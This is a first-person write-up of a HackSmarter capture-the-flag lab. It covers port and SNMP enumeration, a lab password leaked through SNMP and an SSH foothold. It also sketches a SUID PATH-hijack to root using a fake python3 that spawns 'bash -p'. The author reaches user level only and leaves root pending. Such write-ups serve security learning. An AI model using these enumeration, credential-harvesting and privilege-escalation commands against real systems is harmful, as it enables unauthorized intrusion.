# BankSmarterLab – HackSmarter Walkthrough

## Status

User foothold achieved.  
Root access not obtained.  
Lab paused at the `layne.stanley` to `ronnie.stone` pivot stage.

This writeup documents the methodology, findings, commands used, and lessons learned.

---

## 1. VPN Connection

The lab requires VPN access.

```bash
sudo openvpn --config /mnt/c/Users/tmlyz/Downloads/challenge_lab_banksm.ovpn
Successful connection was confirmed by:
ip -br a
Important result:
tun0 UNKNOWN 10.200.53.79/16
The tun0 interface confirmed that the VPN tunnel was active.

2. Initial TCP Enumeration
Target:
10.0.16.155
Initial scan:
sudo nmap -n -Pn --top-ports 1000 10.0.16.155
Result:
22/tcp open ssh
Full TCP scan:
sudo nmap -n -Pn -p- 10.0.16.155
Result again showed only SSH:
22/tcp open ssh
Service/version scan:
sudo nmap -n -Pn -sC -sV -p 22 10.0.16.155
Finding:
OpenSSH 9.6p1 Ubuntu
At this stage, the visible TCP attack surface was only SSH.

3. SSH Authentication Check
We confirmed SSH allowed password authentication:
sudo nmap -p 22 --script ssh-auth-methods 10.0.16.155
Result:
Supported authentication methods:publickeypassword
This showed that valid credentials could provide access.

4. UDP Enumeration and SNMP Discovery
The walkthrough hint suggested that only TCP port 22 was open, but the machine was not broken. This indicated that another protocol may be involved.
SNMP was tested:
snmpwalk -c public -v 2c 10.0.16.155
Important finding:
Admin Layne.Stanley:5t6^jahTRjab'
The SNMP public community string exposed credential-like information.
The usable credential was:
Username: layne.stanleyPassword: 5t6^jahTRjab
Important lesson:
The trailing quote appeared to be formatting and was not part of the working password.

5. Initial Access
SSH login:
ssh layne.stanley@10.0.16.155
Successful access was obtained as:
layne.stanley
This completed the user foothold stage.

6. User Directory Enumeration
After logging in, the home directory was inspected:
ls -la
Important files:
bankSmarter_backup.shuser.txt.ssh/
The user flag was read:
cat user.txt
It contained a Base64 string:
R29vZCBKb2IgRW51bWVyYXRpbmdscyAtbGEhIEtlZXAgaXQgdXAK
Decoded with:
echo "R29vZCBKb2IgRW51bWVyYXRpbmdscyAtbGEhIEtlZXAgaXQgdXAK" | base64 -d
Decoded output:
Good Job Enumeratingls -la! Keep it up
This was a hint, not a root flag.

7. Backup Script Review
The file bankSmarter_backup.sh was inspected:
cat bankSmarter_backup.sh
Important observations:
API_KEYS_DIR="/etc/bank_api_keys"query_accounts_from_db >/dev/nullSMTP_SEND_CMD="/usr/bin/echo"
Findings:


The script attempted to write to /etc/bank_api_keys


The script called query_accounts_from_db


That command was not defined in the script


The script was owned by scott.weiland


This suggested a possible PATH hijack or script execution weakness.
However, running the script as layne.stanley failed because the script attempted to create a directory under /etc:
mkdir: cannot create directory ‘/etc/bank_api_keys’: Permission denied
Conclusion:
The script was interesting but did not provide direct privilege escalation from the current user context.

8. Sudo Check
We checked sudo permissions:
sudo -l
Result:
Sorry, user layne.stanley may not run sudo
Conclusion:
Privilege escalation was not sudo-based.

9. User and Group Enumeration
Local users were checked:
cat /etc/passwd | grep -E "ronnie|scott|layne"
Findings:
layne.stanleyscott.weilandronnie.stone
User group membership:
id scott.weilandid ronnie.stone
Important result:
ronnie.stone groups=ronnie.stone,bankers,tmuxshare,tmuxusers,tmuxshared,bank-team
This was a major finding.
Conclusion:
ronnie.stone was part of the bankers group, which later became important.

10. SUID Enumeration
SUID binaries were searched:
find / -perm -4000 -type f -ls 2>/dev/null
Important finding:
/usr/local/bin/bank_backupd
Permissions:
ls -l /usr/local/bin/bank_backupd
Result:
-rwsr-x--- 1 root bankers /usr/local/bin/bank_backupd
Interpretation:


Owned by root


SUID bit set


Executable only by root and members of bankers


ronnie.stone is in bankers


layne.stanley is not


Conclusion:
The likely root path required pivoting from layne.stanley to ronnie.stone, then executing bank_backupd.

11. Root Exploit Concept
The walkthrough indicated that /usr/local/bin/bank_backupd calls:
/usr/local/bin/bank_backup.py
The Python file was readable:
cat /usr/local/bin/bank_backup.py
Content showed:
#!/usr/bin/env python3
This suggested a PATH hijack opportunity.
Expected exploit after becoming ronnie.stone:
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/python3chmod +x /tmp/python3PATH=/tmp:$PATH /usr/local/bin/bank_backupd
Why this works:


bank_backupd runs with root privileges because of SUID


The Python script uses /usr/bin/env python3


If PATH can be controlled, a fake python3 in /tmp may execute first


/bin/bash -p preserves elevated privileges


However, this could not be executed as layne.stanley because layne.stanley was not in the bankers group.

12. Service Enumeration
Systemd services related to the lab were checked:
systemctl list-units --type=service --all | grep -Ei "bank|ronnie|tmux"
Findings:
bank-pty.service active runningronnie-tmux.service failed
bank-pty.service:
systemctl cat bank-pty.service
Important output:
User=ronnie.stoneGroup=bank-teamExecStart=/usr/bin/python3 /opt/bank/pty_server.pyWorkingDirectory=/opt/bankUMask=007
This confirmed there was a service running as ronnie.stone.
ronnie-tmux.service:
systemctl cat ronnie-tmux.service
Important output:
User=ronnie.stoneExecStart=/opt/bank/start_ronnie_tmux.sh
But the service status showed it had failed:
systemctl status ronnie-tmux.service --no-pager -l
Result:
Active: failed
Conclusion:
A tmux-based pivot may have been intended, but the service was not active in this instance.

13. UNIX Socket Discovery
Listening sockets were checked:
ss -lxnp | grep -i bank
Finding:
/opt/bank/sockets/live.sock
This suggested a local UNIX socket exposed by the bank-pty.service.
Connection attempts:
socat - UNIX-CONNECT:/opt/bank/sockets/live.sock
and:
python3 -c 'import socket; s=socket.socket(socket.AF_UNIX); s.connect("/opt/bank/sockets/live.sock"); s.send(b"help\n"); print(s.recv(4096))'
The socket did not provide useful interaction from the current context.
Conclusion:
The socket was likely part of the intended layne to ronnie pivot, but no working interaction was achieved.

14. Process Enumeration
The running bank service process was identified:
ps aux | grep -i bank
Finding:
ronnie.stone /usr/bin/python3 /opt/bank/pty_server.py
Process status was checked:
cat /proc/586/status | grep -E "Uid|Gid|Groups"
Result:
Uid: 1003Gid: 1008Groups: 1004 1005 1006 1007 1008
Interpretation:


UID 1003 = ronnie.stone


Group 1004 = bankers


The running process had the group needed to execute bank_backupd


However, /proc/586/environ and file descriptors were not readable by layne.stanley.

15. Private Key Finding
A readable RSA private key was discovered under:
/var/lib/fwupd/pki/secret.key
The key was saved locally and tested:
ssh-keygen -y -f /tmp/ronnie_key
The key was valid, but SSH authentication using it failed for:
ronnie.stonescott.weilandlayne.stanley
Conclusion:
The key was a valid private key but was not authorized for SSH login on this target.

16. Summary of Findings
Achieved:


VPN access


TCP enumeration


UDP/SNMP enumeration


Credential discovery through SNMP


SSH foothold as layne.stanley


User flag/hint discovery


SUID root binary discovery


Group-based privilege escalation path identified


Systemd service analysis


UNIX socket discovery


Root path partially identified


Not achieved:


Pivot to ronnie.stone


Execution of /usr/local/bin/bank_backupd


Root shell


/root/root.txt



17. Likely Intended Root Chain
Based on enumeration and walkthrough references, the intended path appears to be:
SNMP → layne.stanley → interact with bank service or tmux → ronnie.stone → bank_backupd PATH hijack → root
The root exploit likely requires:
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/python3chmod +x /tmp/python3PATH=/tmp:$PATH /usr/local/bin/bank_backupd
But this command requires execution as a user in the bankers group.

18. Lessons Learned
SNMP Can Leak Credentials
The initial access came from SNMP:
snmpwalk -c public -v 2c 10.0.16.155
This showed why UDP enumeration matters.

TCP-Only Scanning Can Miss Critical Services
The first scans only showed SSH.
SNMP was missed because it uses UDP.

SUID Is Only Useful If You Can Execute the Binary
Even though bank_backupd was SUID root, layne.stanley could not execute it because of group restrictions.

Group Membership Matters
The bankers group was the key privilege boundary.

Services Can Be Privilege Bridges
The bank-pty.service process ran as ronnie.stone, making it the likely pivot point.

Not Every Key Is an SSH Key for the Target
The discovered RSA private key was valid, but not authorized for SSH login.

19. Final Status
This lab was paused after achieving user-level compromise and identifying the likely privilege escalation path.
Final status:
User: achievedRoot: pendingSubmission: no root submission


